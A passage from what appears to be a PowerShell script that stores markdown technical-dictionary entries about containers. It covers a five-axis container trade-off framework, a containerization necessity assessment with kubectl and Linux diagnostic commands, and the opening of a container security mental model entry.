  NOTE: containers score LOWER here (shared kernel)

Axis 3: OPERATIONAL COMPLEXITY TOLERANCE
  5 = team has full K8s + container expertise
  3 = team learning containers
  1 = no container expertise, no platform team
  NOTE: containers REQUIRE higher ops complexity

Axis 4: STARTUP LATENCY SENSITIVITY
  5 = fast startup critical (autoscaling, FaaS)
  3 = moderate (batch, API services)
  1 = startup irrelevant (persistent databases)

Axis 5: SECURITY POSTURE REQUIREMENT
  5 = shared kernel acceptable (trusted code)
  3 = sandboxed runtime required (gVisor/Kata)
  1 = hardware-level isolation required (VM minimum)
```

**DECISION MATRIX:**

```
Axis Score   Interpretation
19-25        Strong container fit
13-18        Container viable with trade-off management
8-12         Containers possible but alternatives worth evaluating
<8           Containers likely wrong choice; use VM or managed service
```

---

### 🔄 The Complete Picture - End-to-End Flow

**NORMAL FLOW (Trade-off analysis for one workload):**

```
Identify workload for containerisation decision
  |
  v
Score Portability (1-5)
  |
  v
Score Isolation Requirement (1-5)
  |         ← YOU ARE HERE
  v
Score Operational Complexity Tolerance (1-5)
  |
  v
Score Startup Latency Sensitivity (1-5)
  |
  v
Score Security Posture Requirement (1-5)
  |
  v
Total score -> Decision recommendation
  |
  v
Document trade-offs accepted/mitigated
```

**FAILURE PATH:**
Team skips the trade-off analysis. Containerises a workload with low
portability need (single-cloud, single-region, stateful) purely because
"containers are standard." 6 months later, the team spends more time
on PersistentVolume management, backup strategy, and container storage
interface issues than on the original problem the technology was meant
to solve.

**WHAT CHANGES AT SCALE:**
At scale (hundreds of workloads), individual workload analysis is
replaced by workload type classification: "all stateless APIs: container
fit HIGH; all OLTP databases: container fit LOW (use managed DB service);
all batch workloads: container fit MEDIUM." The classification is derived
from the trade-off analysis applied to representative examples of each
type.

---

### ⚖️ Comparison Table

| Workload Type | Portability | Isolation | Ops Complexity | Startup | Container Fit |
|---|---|---|---|---|---|
| Stateless API | High | Standard | Medium | Critical | STRONG |
| Batch job | Medium | Standard | Medium | Moderate | STRONG |
| OLTP Database | Low | Standard | High (PV, backup) | Irrelevant | WEAK |
| Real-time system | Low | Standard | High (scheduling) | Critical (ms) | POOR |
| ML inference | Medium | Standard | Medium | Moderate | MODERATE |
| Multi-tenant FaaS | High | High (sandbox req) | High | Critical | MODERATE (with gVisor) |

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|---|---|
| "Containers are always more secure than VMs" | Containers have a SHARED kernel attack surface. VMs have hardware-level kernel isolation. For workloads requiring strong isolation between tenants, VMs provide a fundamentally stronger security boundary. |
| "Containerising improves performance" | Container runtime overhead is minimal for CPU-bound workloads. But containerised databases on PersistentVolumes can have higher I/O latency than bare-metal storage, and containerised real-time systems suffer from scheduling jitter. |
| "If it works in containers, it's the right choice" | Technical feasibility is not the same as trade-off optimality. A database CAN run in a container, but the operational complexity may not be justified by the portability gain. |
| "Container operational complexity decreases over time" | Platform operational complexity decreases as the team gains expertise. But total complexity (platform + application) often increases as more features are adopted (operators, CRDs, GitOps). |
| "The startup latency advantage of containers matters for all workloads" | Startup latency matters for autoscaling, burst workloads, and FaaS. For a persistent database or long-running batch job, startup latency is irrelevant. |

---

### 🚨 Failure Modes & Diagnosis

**Failure Mode 1: Database Containerised Without Storage Strategy**
**Symptom:** PostgreSQL pod restarts after a node replacement. Data
stored in the container layer is lost. Team discovers PersistentVolume
was not configured.
**Root Cause:** Containerisation decision ignored the "operational
complexity" axis for stateful workloads. No storage strategy was
defined before migration.
**Diagnostic:**

```bash
# Check if PVC is configured
kubectl get pvc -n production

# Check where data is stored in the postgres pod
kubectl exec postgres-pod -- \
  psql -c "SHOW data_directory;"

# Verify data directory is on a PVC, not emptyDir
kubectl describe pod postgres-pod | \
  grep -A 3 "Volumes:"
```

**Fix:** Migrate data to a PersistentVolumeClaim with appropriate
storage class (SSD for OLTP). Implement backup automation.
**Prevention:** Score the operational complexity axis >=3 before
containerising stateful workloads. Require PVC + backup plan as
pre-conditions.

---

**Failure Mode 2: Real-Time System with Container Scheduling Jitter**
**Symptom:** A containerised real-time system (PLC interface, audio
processing) experiences periodic latency spikes of 10-50ms. Root cause
traced to Kubernetes scheduler preemption.
**Root Cause:** Containers on a shared Kubernetes node compete for CPU
with other containers. The Kubernetes scheduler introduces jitter
incompatible with real-time requirements (<1ms).
**Diagnostic:**

```bash
# Check CPU throttling
cat /sys/fs/cgroup/$(cat /proc/$(pgrep realtime-process)/cgroup \
  | grep "0::" | cut -d: -f3)/cpu.stat | grep throttled

# Check scheduling latency
perf sched latency -s max 2>/dev/null | head -20
```

**Fix:** Migrate to bare metal with a real-time kernel (PREEMPT_RT
patch) or a dedicated VM with CPU pinning. Containers on shared
infrastructure cannot provide hard real-time guarantees.
**Prevention:** Score the startup latency/scheduling axis carefully.
Real-time requirements (<1ms) are incompatible with standard container
scheduling. This is a POOR fit on the trade-off scale.

---

**Failure Mode 3: Security Posture Regression from Containerisation**
**Symptom:** Security audit finds that a workload previously isolated
in its own VM now shares a kernel with 30 other workloads in a container.
A kernel vulnerability affects all 31 workloads simultaneously.
**Root Cause:** Containerisation decision did not explicitly evaluate
the isolation axis. The team assumed "containers are secure" without
acknowledging the shared kernel trade-off.
**Diagnostic:**

```bash
# Identify workloads sharing a kernel (on same node)
kubectl get pods -o wide | grep <node-name>
# All pods on this node share the host kernel

# Check if any workloads have different trust levels
kubectl get pods -A -o json | jq '
  .items[] | {
    name: .metadata.name,
    namespace: .metadata.namespace,
    privileged: .spec.containers[].securityContext.privileged
  }'
```

**Fix:** Apply gVisor (RuntimeClass) to isolated workloads. Alternatively,
run high-isolation workloads on dedicated nodes (node affinity + taints).
**Prevention:** Explicitly score the isolation axis. Workloads with
isolation score < 3 require additional controls (gVisor, dedicated
nodes, or VMs).

---

### 🔗 Related Keywords

**Prerequisites (understand these first):**

- [[CTR-001 - What Is Containerization and Why It Matters]] - container fundamentals
- [[CTR-002 - VMs vs Containers -- A Mental Model]] - the core comparison
- [[CTR-043 - Container Platform Strategy]] - platform-level decisions

**Builds On This (learn these next):**

- [[CTR-053 - Containerization Necessity Assessment]] - applying the framework per workload

**Alternatives / Comparisons:**

- [[CTR-043 - Container Platform Strategy]] - platform choice decisions
- [[CTR-046 - Containerization Migration Strategy]] - migration execution

---

### 📌 Quick Reference Card

```
┌────────────────────────────────────────────────────┐
│ WHAT IT IS  │ 5-axis container trade-off framework │
│ PROBLEM     │ "Containerise everything" blindspots │
│ KEY INSIGHT │ Score portability, isolation, ops,  │
│             │ startup, security per workload       │
│ USE WHEN    │ Any containerisation decision        │
│ AVOID WHEN  │ N/A - always apply before deciding  │
│ TRADE-OFF   │ Portability gain vs. isolation cost │
│ ONE-LINER   │ 5 axes, score each, decide by total │
│ NEXT EXPLORE│ CTR-053 Necessity Assessment        │
└────────────────────────────────────────────────────┘
```

**If you remember only 3 things:**

1. Containers gain on portability and startup latency; they cost on
   isolation (shared kernel) and operational complexity.
2. Stateless workloads fit containers well; stateful workloads (databases,
   real-time systems) often fit containers poorly.
3. Score five axes (portability, isolation, ops complexity, startup,
   security posture) explicitly before containerising any workload.

**Interview one-liner:**
"Container trade-off framing replaces 'should we containerise?' with
a five-axis analysis: containers gain on portability and startup speed
but cost on isolation (shared kernel) and operational complexity - the
optimal answer varies by workload type."

---

### 💎 Transferable Wisdom

**Reusable Engineering Principle:**
Every technology choice involves trade-offs across multiple dimensions.
Evaluating choices on a single dimension (performance, cost, security)
always misses important considerations. Multi-axis trade-off framing
makes all relevant dimensions explicit and prevents single-axis
optimisation that degrades other dimensions unexpectedly.

**Where else this pattern appears:**

- **Database technology selection:** SQL vs. NoSQL evaluated across:
  consistency requirements, query flexibility, operational complexity,
  scaling pattern, and cost. No single axis determines the right choice.
- **Cloud provider selection:** AWS vs. GCP vs. Azure evaluated across:
  service breadth, regional availability, pricing model, operational
  tooling maturity, and team expertise. Multi-axis decision.
- **Programming language selection for a new service:** Performance,
  team expertise, library ecosystem, deployment model, and operational
  tooling are all relevant axes. "Python is slower than Go" is a one-axis
  analysis that ignores the others.

---

### 💡 The Surprising Truth

The most common container adoption failure mode is not a security breach
or a performance problem - it is permanently elevated operational
complexity. Teams that containerise workloads without solving the
operational complexity axis (CI/CD for containers, observability,
secrets management, storage) spend more engineering time on platform
operations after containerisation than before. The CNCF Annual Survey
consistently shows that "operational complexity" is the top challenge
reported by container adopters - more common than security issues or
performance problems. Containers make the application portable at the
cost of making the infrastructure more complex, and the infrastructure
complexity is often underestimated.

---

### 🧠 Think About This Before We Continue

**Q1 (C - Design Trade-off):** A team is containerising a PostgreSQL
database. They argue that containerisation gives them "environment
consistency" (portability axis). A database architect argues the
portability gain is minimal because the database schema, data files,
and tuning parameters are all environment-specific anyway. Who is correct,
and what does this reveal about the portability axis for stateful workloads?
*Hint:* Portability for stateless services means "run the same image
anywhere." Portability for stateful services means... what, exactly?
Can you run a PostgreSQL container with 2TB of production data in a
development environment? What is actually portable?

**Q2 (B - Scale):** At an organisation running 500 containers, the
operational complexity trade-off is managed by a 6-person platform team.
The organisation grows to 2,000 containers. What happens to the
operational complexity axis, and what architectural decisions reduce
the platform team scaling requirement below linear growth?
*Hint:* Consider: GitOps (ArgoCD reduces deployment complexity),
Internal Developer Platform (self-service reduces platform team
involvement), Managed Kubernetes (reduces node management). Which of
these reduces operational complexity per container, vs. which reduces
platform team involvement per team?

**Q3 (A - System Interaction):** A containerised microservice stores
session data in a local in-memory cache (the container's RAM). The
microservice scales from 1 to 10 replicas under load. Users now have
inconsistent sessions (sticky sessions not configured). Trace the
failure: which trade-off axis was violated, and what architectural
change resolves it without abandoning containers?
*Hint:* Consider the portability axis: a stateless container should
not store state in its process memory if it scales horizontally. What
does "portability" actually mean for stateful session data, and what
external component (Redis, Elasticache) externalises the state?
'@

# ── CTR-053 ──────────────────────────────────────────────────────────────
$ctr053 = @'
---
id: CTR-053
title: Containerization Necessity Assessment
category: Containers
tier: tier-6-infrastructure-devops
folder: CTR-containers
difficulty: ★★★
depends_on: CTR-001, CTR-043, CTR-052
used_by:
related: CTR-046, CTR-052
tags:
  - containers
  - architecture
  - mental-model
  - bestpractice
  - tradeoff
status: complete
version: 1
layout: default
parent: "Containers"
grand_parent: "Technical Dictionary"
nav_order: 53
permalink: /ctr/containerization-necessity-assessment/
---

# CTR-053 - Containerization Necessity Assessment

⚡ TL;DR - Containerization necessity assessment is the structured question "does containerising this specific workload create net value?" - evaluating the concrete gains against the concrete costs before committing to migration.

| Metadata        |                            |     |
| :-------------- | :------------------------- | :-- |
| **Depends on:** | CTR-001, CTR-043, CTR-052   |     |
| **Used by:**    |                            |     |
| **Related:**    | CTR-046, CTR-052           |     |

---

### 🔥 The Problem This Solves

**WORLD WITHOUT IT:**
A platform engineering team declares "all services must be containerised
by Q4." Teams comply. A monolithic billing service is containerised.
The service runs fine in the container but now requires: a CI/CD pipeline
for images, a container registry, a Kubernetes deployment manifest, a
PersistentVolume for its local filesystem dependencies, and 3 months
of migration effort. The service's behaviour is identical before and
after. The containerisation created no user-visible value and added
permanent operational overhead.

**THE BREAKING POINT:**
The "containerise everything" mandate reaches a legacy COBOL batch
system that runs on a mainframe emulator, requires specific hardware
timing, and processes overnight payroll. The containerisation attempt
fails after 6 months. The original mandate never included a "should
we containerise?" question - only a "how do we containerise?" question.

**THE INVENTION MOMENT:**
Containerization necessity assessment separates the strategic question
("should we?") from the tactical question ("how do we?"). It prevents
containerisation from becoming a technology mandate that ignores workload
suitability.

**EVOLUTION:**
2015: Containers first adopted selectively for suitable workloads.
2017: Kubernetes maturity drives blanket adoption mandates. 2019:
Post-adoption retrospectives reveal that ~20% of containerised workloads
gained no net value from containerisation. 2021: Platform engineering
matures to include "golden path" selection (not every workload follows
the container path). 2023: FinOps analysis adds cost-benefit to
necessity assessment - some workloads cost more to run containerised
(managed services often cheaper for databases).

---

### 📘 Textbook Definition

**Containerization necessity assessment** is a structured evaluation
framework that determines whether a specific workload should be
containerised by explicitly weighing the concrete gains (portability,
density, deployment consistency, autoscaling) against the concrete
costs (migration effort, operational complexity, storage complexity,
team training). The assessment produces one of three outcomes: STRONG
FIT (containerise now), WEAK FIT (containerise with caveats), or
NOT RECOMMENDED (use alternative: managed service, VM, or bare metal).

---

### ⏱️ Understand It in 30 Seconds

**One line:**
Ask "what specific problem does containerising this workload solve?"
before containerising it.

**One analogy:**

> Containerization necessity assessment is like a home renovation
> proposal review. Before demolishing a perfectly functional kitchen
> to install an open-plan design, you ask: what problem are we solving?
> Who benefits? What is the cost? What is the disruption? If the answers
> are "we saw it on a design show, no one specifically, $80,000, and
> 3 months of living in chaos," you reconsider.

**One insight:**
The most important question in containerization necessity assessment
is not "can we containerise this?" but "what specific, measurable
problem does containerisation solve for this workload?" If the answer
is "it's the standard" or "everyone else is doing it," that is not a
problem statement - it is social pressure.

---

### 🔩 First Principles Explanation

**CORE INVARIANTS:**

1. **Containerisation must solve a specific, identified problem** -
   "environment consistency," "faster deployments," "higher density,"
   or "easier rollback" are valid problems. "It's the standard" is not.
2. **Migration cost is non-zero** - every containerisation migration
   requires engineering time, CI/CD changes, and operational learning.
   The net value must exceed this cost.
3. **Not all workloads benefit equally** - stateless, multi-environment
   workloads benefit most. Stateful, hardware-specific, or single-
   environment workloads benefit least.
4. **Alternative paths have lower cost for some workloads** - a managed
   database service solves the operational complexity of running a database
   at lower total cost than containerising it, with less migration effort.

**DERIVED DESIGN:**
Given invariant 1: define the problem statement before beginning
assessment. Given invariant 4: include managed services as an alternative
in the assessment, not just VM vs. container.

**THE TRADE-OFFS:**
**Gain from assessment:** Prevents wasted migration effort on workloads
that gain no net value. Identifies the right alternative for unsuitable
workloads.
**Cost of assessment:** Time to conduct the assessment. This is always
less than the time wasted on an unnecessary migration.

**ESSENTIAL vs ACCIDENTAL COMPLEXITY:**
**Essential:** Every technology decision requires a problem statement
and a value/cost analysis.
**Accidental:** Technology mandate without assessment. Social pressure
driving technical decisions.

---

### 🧪 Thought Experiment

**SETUP:**
Three workloads awaiting "containerisation" as per the platform mandate:
(A) A Node.js API service, deployed to 3 environments (dev/staging/prod)
(B) A self-hosted Elasticsearch cluster (stateful, 500GB data)
(C) A cron job that runs nightly reports (5 minutes duration, once per day)

**NECESSITY ASSESSMENT:**

Workload A (Node.js API):
- Problem solved: environment inconsistency, slow deployment, no autoscaling
- Gain: consistent image, faster CI, HPA autoscaling
- Cost: CI/CD pipeline (1 week), K8s manifest (2 days)
- Alternative: AWS Lambda? No - long-running service, Lambda cold start
- Verdict: STRONG FIT - containerise

Workload B (Elasticsearch):
- Problem solved: want to use K8s for everything
- Gain: K8s scheduling (minimal), portability (not needed - single env)
- Cost: Elasticsearch operator complexity, PV management, backup strategy
- Alternative: Amazon OpenSearch Service (managed, no ops overhead)
- Verdict: NOT RECOMMENDED - use managed service

Workload C (Cron Job):
- Problem solved: inconsistent execution environment
- Gain: consistent environment (same as VM cron)
- Cost: K8s CronJob + image + CI pipeline
- Alternative: AWS EventBridge + Lambda, or VM cron
- Verdict: WEAK FIT - K8s CronJob viable but Lambda may be simpler

**THE INSIGHT:**
The same platform mandate produces three different answers for three
workloads. Necessity assessment prevents blanket compliance with a
mandate that is right for A, wasteful for B, and debatable for C.

---

### 🧠 Mental Model / Analogy

> Containerization necessity assessment is like a building permit
> process. Before starting construction, you must answer: what are
> you building, why do you need it, and does the benefit justify the
> cost and disruption? The permit board does not approve construction
> just because "it's a building standard" - they approve it when there
> is a justified need and a viable plan.

Element mapping:

- **Building permit** = necessity assessment gate
- **Construction plans** = containerisation plan
- **Permit board** = platform team / architecture review
- **What are you building?** = workload characteristics
- **Why do you need it?** = problem statement
- **Cost and disruption** = migration effort and ops complexity

Where this analogy breaks down: a building permit is a regulatory
requirement; necessity assessment is a voluntary engineering discipline.
Without organisational commitment, teams bypass it under deadline pressure.

---

### 📶 Gradual Depth - Four Levels

**Level 1 - What it is (anyone can understand):**
Containerization necessity assessment is asking "should we?" before
"how do we?" when deciding whether to put an application in a container.

**Level 2 - How to use it (junior developer):**
For each workload, answer three questions before containerising:
(1) What specific problem does containerisation solve for this workload?
(2) What is the estimated migration effort in engineer-days?
(3) Is there a simpler alternative (managed service, keep on VM)?
If question 1 has no specific answer, stop and reconsider.

**Level 3 - How it works (mid-level engineer):**
Apply a four-step assessment: (1) Problem statement - what does
containerisation specifically solve? (2) Gain quantification - which
container benefits apply (portability, density, consistency, autoscaling,
fast startup)? (3) Cost quantification - migration effort, operational
complexity, storage complexity, team training. (4) Alternative comparison -
managed service, VM, FaaS. The output is a recommendation with the
trade-off stated explicitly.

**Level 4 - Why it was designed this way (senior/staff):**
Containerization necessity assessment exists as a corrective to the
"technology mandate" problem. When a platform team mandates containers
for all workloads, teams optimise for compliance, not for value.
Assessment gates prevent compliance-driven containerisation of unsuitable
workloads. The framework forces a problem statement, which prevents
technology from becoming an end in itself. The inclusion of alternatives
(managed services) prevents false binary thinking (container or VM only).

**Expert Thinking Cues:**

- "What specific metric improves when this workload is containerised?
  Deployment frequency? MTTR? Resource utilisation? If no metric
  improves, the value is unclear."
- "What is the total cost of ownership comparison: containerised
  workload (image + registry + K8s + operator + on-call) vs. managed
  service (SLA + cost per unit)?"
- "Who is the primary beneficiary of containerisation? Developer DX?
  Ops team? The application's users? If no one benefits specifically,
  the value is unclear."

---

### ⚙️ How It Works (Mechanism)

**NECESSITY ASSESSMENT DECISION TREE:**

```
Step 1: Problem Statement
  "Containerising [workload] solves: ____________"
  If blank -> STOP. Reconsider or defer.

Step 2: Gains Apply?
  [ ] Environment consistency across 2+ envs?
  [ ] Autoscaling is needed?
  [ ] Fast startup (<5s) is needed?
  [ ] Higher density needed (many instances/host)?
  [ ] Faster deployment cycle needed?
  Any YES -> gains exist. Continue.
  All NO  -> WEAK FIT or NOT RECOMMENDED.

Step 3: Costs Acceptable?
  Migration effort:  _____ engineer-days
  Ops complexity:    LOW / MEDIUM / HIGH
  Storage complexity: LOW / MEDIUM / HIGH (stateful)
  Team training:     _____ engineer-days
  Total cost: _____
  If HIGH cost + LOW gains -> NOT RECOMMENDED.

Step 4: Alternative Comparison
  Managed service (RDS, OpenSearch) better?
  FaaS (Lambda, Cloud Run) better?
  Stay on VM (simpler, sufficient) better?
  If alternative is clearly better -> use alternative.

Output: STRONG FIT / WEAK FIT / NOT RECOMMENDED
```

---

### 🔄 The Complete Picture - End-to-End Flow

**NORMAL FLOW:**

```
Platform mandate: "containerise workload X"
  |
  v
Step 1: Define problem statement
  |         ← YOU ARE HERE
  v
Step 2: Score gains (portability, density, etc.)
  |
  v
Step 3: Estimate costs (effort, ops complexity)
  |
  v
Step 4: Compare to alternatives
  |
  v
Recommendation: STRONG/WEAK/NOT RECOMMENDED
  |
  ├─ STRONG: proceed to CTR-046 migration strategy
  ├─ WEAK: proceed with documented caveats
  └─ NOT RECOMMENDED: document and escalate
```

**FAILURE PATH:**
Assessment skipped under deadline pressure. Workload containerised
on mandate. 6 months later: the team spends 20% of sprint capacity
on container-specific operational issues (PV management, image
vulnerability remediation) that add no user-visible value.

**WHAT CHANGES AT SCALE:**
At scale, individual assessments are replaced by workload type
classification: pre-approved patterns (stateless APIs: STRONG FIT
by default; OLTP databases: NOT RECOMMENDED by default; batch jobs:
evaluate individually). The classification document reduces per-
workload assessment time from hours to minutes.

---

### ⚖️ Comparison Table

| Workload Type | Typical Gains | Typical Costs | Default Verdict |
|---|---|---|---|
| Stateless API (multi-env) | High (portability, autoscale) | Low-Medium | STRONG FIT |
| Batch/cron job | Medium (consistency) | Low | WEAK FIT (K8s CronJob) |
| OLTP database | Low (portability minimal) | High (PV, backup, ops) | NOT RECOMMENDED |
| Message queue (self-hosted) | Low-Medium | High (operator, PV) | NOT RECOMMENDED (managed) |
| ML model serving | High (GPU scheduling, scale) | Medium | STRONG FIT |
| Legacy monolith (single env) | Low (no multi-env benefit) | High (refactor) | WEAK FIT at best |
| Real-time control system | None (<1ms jitter incompatible) | High | NOT RECOMMENDED |

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|---|---|
| "Containerisation always improves developer experience" | Container DX is better for deployment consistency and reproducibility. But containers add cognitive load (Dockerfile, K8s YAML, registry management) that can worsen DX for teams not familiar with the toolchain. |
| "If we can containerise it, we should" | Technical feasibility is not the same as business necessity. A PostgreSQL database can be containerised; in most cases, a managed database service (RDS, Cloud SQL) is a better alternative with lower operational cost. |
| "Containerisation is free if we have Kubernetes already" | The platform cost is shared, but the per-workload migration effort (Dockerfile, CI/CD, K8s manifests, secrets management) is non-zero for every workload. |
| "Not containerising means we're behind" | Technology decisions should be made based on value delivered, not industry trend compliance. A well-operated VM running a legacy service that generates value is better than a poorly containerised service that generates operational debt. |
| "Necessity assessment slows down containerisation" | A 2-hour necessity assessment that prevents a 3-month failed migration effort is the fastest path. Assessment reduces total time spent; it only appears to slow down by adding a front-loaded step. |

---

### 🚨 Failure Modes & Diagnosis

**Failure Mode 1: Cargo Cult Containerisation**
**Symptom:** A service is containerised because "the platform mandate
says so," but post-migration metrics show no improvement in deployment
frequency, MTTR, resource utilisation, or developer satisfaction.
**Root Cause:** No problem statement defined before migration. The
containerisation was driven by compliance with a mandate, not by a
specific engineering problem.
**Diagnostic:**

```bash
# Compare deployment metrics before and after
# (requires DORA metrics tracking)
# Key questions:
# - Did deployment frequency change? (git log --since=<pre-date>)
# - Did MTTR change? (incident log comparison)
# - Did resource utilisation change? (kubectl top pods vs. VM metrics)
# - Did on-call incidents change? (PagerDuty comparison)

# Check operational overhead added post-containerisation
# How many hours/week spent on container-specific ops?
# (image scanning, PVC management, pod restarts investigation)
```

**Fix:** Retrospective analysis: identify what value was expected and
what was delivered. Document as a lesson learned for future assessments.
If ongoing operational overhead exceeds benefit, consider reversing the
migration.
**Prevention:** Require a defined problem statement and measurable
success metrics before approving containerisation. Review metrics 90
days post-migration.

---

**Failure Mode 2: Managed Service Overlooked in Assessment**
**Symptom:** Team spends 3 months containerising a self-hosted Redis
cluster with Kubernetes Operator, PersistentVolumes, backup automation,
and cross-AZ replication. 6 months later, the platform team reviews
cost and finds ElastiCache Redis would have been 60% cheaper with zero
operational overhead.
**Root Cause:** The necessity assessment compared only "container vs.
VM" and did not include managed services as an alternative.
**Diagnostic:**

```bash
# Calculate true cost of self-hosted containerised Redis:
# - EC2 instance cost (3x for Redis cluster)
# - EBS volume cost (PersistentVolumes)
# - Platform team time (operator maintenance)
# - On-call time (Redis cluster incidents)
# - Developer time (backup/restore testing)

# Compare to managed service:
# - ElastiCache pricing: aws elasticache describe-cache-clusters
# - Total: instance cost only, no ops overhead
```

**Fix:** Document the cost delta as a lesson learned. Evaluate migration
to managed service. If migration cost < (ops overhead savings * 12 months),
migrate.
**Prevention:** Always include managed services in the necessity
assessment's alternative comparison step. For any stateful workload,
the first comparison should be "managed service vs. self-hosted container."

---

**Failure Mode 3: Assessment Bypassed Under Deadline**
**Symptom:** A team containerises a workload in 2 weeks to meet a
platform deadline, skipping the necessity assessment. The containerisation
introduces a previously unknown dependency on a host-level kernel module
that is not available in the container environment.
**Root Cause:** The assessment step was skipped. The pre-migration
dependency audit (part of necessity assessment) would have identified
the kernel module dependency.
**Diagnostic:**

```bash
# Identify kernel module dependencies
lsmod | grep <module_name>

# Check if module is available in container
kubectl exec <pod> -- lsmod 2>/dev/null | grep <module>
# If not available, the workload needs the host kernel module
# (requires privileged container or host module loading)
```

**Fix:** Add `privileged: true` temporarily (security risk) OR extract
the kernel-module-dependent component to a separate workload on a
dedicated host. Long-term: refactor to remove the kernel module dependency.
**Prevention:** Necessity assessment includes a pre-migration dependency
audit. Kernel module dependencies are a hard blocker for standard
containerisation.

---

### 🔗 Related Keywords

**Prerequisites (understand these first):**

- [[CTR-001 - What Is Containerization and Why It Matters]] - container basics
- [[CTR-043 - Container Platform Strategy]] - platform selection context
- [[CTR-052 - Container Trade-off Framing]] - the trade-off framework this assessment uses

**Builds On This (learn these next):**

- [[CTR-046 - Containerization Migration Strategy]] - how to migrate after a positive assessment

**Alternatives / Comparisons:**

- [[CTR-046 - Containerization Migration Strategy]] - migration after positive assessment
- [[CTR-052 - Container Trade-off Framing]] - the theoretical framework behind assessment

---

### 📌 Quick Reference Card

```
┌────────────────────────────────────────────────────┐
│ WHAT IT IS  │ "Should we containerise?" framework │
│ PROBLEM     │ Cargo cult containerisation         │
│ KEY INSIGHT │ Problem statement first, always     │
│ USE WHEN    │ Any workload containerisation decision│
│ AVOID WHEN  │ N/A - always ask "should we?" first │
│ TRADE-OFF   │ Assessment time vs. wasted migration│
│ ONE-LINER   │ What problem? What gain? What cost? │
│ NEXT EXPLORE│ CTR-046 Migration Strategy          │
└────────────────────────────────────────────────────┘
```

**If you remember only 3 things:**

1. Define the problem statement first: "containerising this workload
   solves X" - if X is blank, stop.
2. Always include managed services as an alternative - for stateful
   workloads, managed services often beat self-hosted containers.
3. Measure success 90 days post-migration against the original problem
   statement metrics - no measurement = no learning.

**Interview one-liner:**
"Containerization necessity assessment separates 'should we?' from
'how do we?' by requiring a specific problem statement, gain quantification,
cost estimation, and alternative comparison before any containerisation
migration begins."

---

### 💎 Transferable Wisdom

**Reusable Engineering Principle:**
Technology adoption decisions must be driven by specific problem
statements, not by industry trend or mandate compliance. "Everyone
is doing it" and "it's the standard" are social proof, not engineering
justification. The right question is always "what specific, measurable
problem does this technology solve for this specific workload?"

**Where else this pattern appears:**

- **Microservices adoption:** "Should we split this monolith into
  microservices?" requires the same assessment: what specific problem
  does it solve (deployment independence? team autonomy? scaling
  isolation?), and does the distributed systems overhead justify it?
- **GraphQL adoption:** "Should we replace our REST API with GraphQL?"
  requires: what over-fetching problem do clients have, what is the
  migration cost, and is a REST API with sparse fieldsets a simpler
  alternative?
- **Event sourcing adoption:** "Should we use event sourcing for this
  service?" requires: what audit trail, temporal query, or replay
  requirement justifies the operational complexity of an event store?

---

### 💡 The Surprising Truth

The 2023 CNCF Annual Survey found that 26% of respondents who had
containerised workloads reported that at least some of their containerised
workloads "should not have been containerised" in retrospect. The most
common reason: "the operational complexity added did not justify the
portability or consistency benefits." The second most common reason:
"a managed service would have been more cost-effective." These are
exactly the findings a necessity assessment would have surfaced before
migration. The survey data suggests that approximately 1 in 4 container
migrations globally could have been avoided or redirected to managed
services with a pre-migration assessment, saving millions of engineering-
hours industry-wide.

---

### 🧠 Think About This Before We Continue

**Q1 (C - Design Trade-off):** A team has a legacy Java EE monolith
(EJB-based, requires a full JEE application server). Two options:
(A) Containerise the monolith as-is (lift-and-shift, JBoss in a
container), or (B) Modernise to Spring Boot before containerising.
What does the necessity assessment reveal about option A, and what
are the hidden costs that make option A less attractive than it first
appears?
*Hint:* Consider: a containerised JBoss starts slower (30s+) than a
Spring Boot service (<5s). The image is larger (1GB+ vs. 200MB). The
portability gain is the same. The hidden cost of option A is carrying
forward EJB complexity into the container era. What is the long-term
cost of maintaining a containerised EJB monolith?

**Q2 (B - Scale):** A platform team must assess 150 workloads for
containerisation in a 3-month planning cycle. Individual necessity
assessments take 4 hours each. The total assessment time (600 engineer-
hours) exceeds the available capacity (160 hours across 2 architects).
How do you scale the assessment process without eliminating it?
*Hint:* Consider workload type classification (all stateless APIs: STRONG
FIT by default, no per-workload assessment required; all OLTP databases:
NOT RECOMMENDED by default). How many workload types cover 80% of the
portfolio? What is the residual that requires individual assessment?

**Q3 (A - System Interaction):** A containerised Node.js service uses
the host's `/var/run/secrets/corporate-ca.crt` file to trust a corporate
CA for internal TLS connections. On VMs, this file exists by default.
In containers, the file does not exist. The necessity assessment did
not identify this dependency. At what phase of the migration would this
dependency have been discoverable, and what is the proper container-
native way to provide CA certificates to container workloads?
*Hint:* The dependency audit in the necessity assessment is the right
phase. For the fix: Kubernetes ConfigMaps can inject CA certificates
as mounted files. How does the workload discover the certificate path?
Hardcoded path vs. environment variable configuration.
'@

# ── CTR-054 ──────────────────────────────────────────────────────────────
$ctr054 = @'
---
id: CTR-054
title: Container Security Mental Model
category: Containers
tier: tier-6-infrastructure-devops
folder: CTR-containers
difficulty: ★★★
depends_on: CTR-021, CTR-044, CTR-051
used_by:
related: CTR-044, CTR-051
tags:
  - containers
  - security
  - mental-model
  - advanced
  - bestpractice
status: complete
version: 1
layout: default
parent: "Containers"
grand_parent: "Technical Dictionary"
nav_order: 54
permalink: /ctr/container-security-mental-model/
---

# CTR-054 - Container Security Mental Model

⚡ TL;DR - The container security mental model is threat-model-first thinking: identify the attack surface at each layer (supply chain, runtime, network, secrets, kernel), define the blast radius of each compromise, and apply the minimum control set that reduces blast radius to an acceptable level.

| Metadata        |                          |     |
| :-------------- | :----------------------- | :-- |
| **Depends on:** | CTR-021, CTR-044, CTR-051 |     |
| **Used by:**    |                          |     |
| **Related:**    | CTR-044, CTR-051         |     |

---

### 🔥 The Problem This Solves

**WORLD WITHOUT IT:**
A security team applies container security controls reactively: non-root
after a pentest recommendation, image scanning after a CVE disclosure,
network policies after a lateral movement incident. Each control is
added in response to an incident, not as part of a coherent threat
model. The controls don't form a consistent defence because they weren't
designed together - they were bolted on.

**THE BREAKING POINT:**
A compliance audit requires the team to demonstrate container security.
The team lists their controls: "we use non-root, we scan images, we
have a network policy." The auditor asks: "what is your threat model?
What is the blast radius if container X is fully compromised?" The team
cannot answer because they have no mental model - only a checklist.

**THE INVENTION MOMENT:**
The container security mental model reframes security from "what controls
do we have?" to "what can an attacker do at each layer, and which
controls limit their blast radius?" This threat-model-first approach
produces a consistent, gap-free security posture rather than a reactive
checklist.

**EVOLUTION:**
2014: Docker security guidance focuses on "don't run as root." 2017:
Kubernetes Pod Security Policy (deprecated 2021) adds cluster-level
controls. 2019: NIST SP 800-190 (Application Container Security Guide)
formalises the layered threat model. 2021: Supply chain attacks (Solar-
Winds, Log4Shell) shift focus to the build-time attack surface. 2022:
